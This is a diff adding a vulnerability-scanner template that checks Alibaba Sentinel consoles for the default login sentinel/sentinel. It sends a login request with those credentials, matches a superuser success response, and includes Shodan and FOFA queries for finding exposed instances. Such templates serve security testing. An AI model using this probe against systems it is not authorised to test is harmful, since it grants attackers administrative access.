@@ -1,0 +1,50 @@
+id: alibaba-sentinel-default-login
+info:
+  name: Alibaba Sentinel 默认凭证登录
+  author: wujiecong
+  severity: high
+  description: |-
+    Alibaba Sentinel 1.6.0 及后续版本存在默认登录接口，攻击者可使用默认凭证 sentinel/sentinel 进行认证。此模板用于检测受影响版本中是否存在此类默认登录行为。
+
+    fofa 查询语法：count: 29699743
+  reference:
+  - https://github.com/alibaba/sentinel
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2021-35876
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 8.8
+    cwe-id: CWE-522
+  metadata:
+    max-request: 1
+    verified: true
+    shodan-query: http.html:"Sentinel 控制台"
+  tags: alibaba, sentinel
+http:
+- raw:
+  - |
+    POST /auth/login?password={{password}}&username={{username}} HTTP/1.1
+    Host: {{Hostname}}
+    Accept: application/json, text/plain, */*
+    Content-Length: 0
+  attack: pitchfork
+  payloads:
+    username:
+    - sentinel
+    password:
+    - sentinel
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - '"success":true'
+    - '"superUser":true'
+    - '"loginName":"sentinel"'
+    condition: and
+  - type: word
+    part: content_type
+    words:
+    - application/json
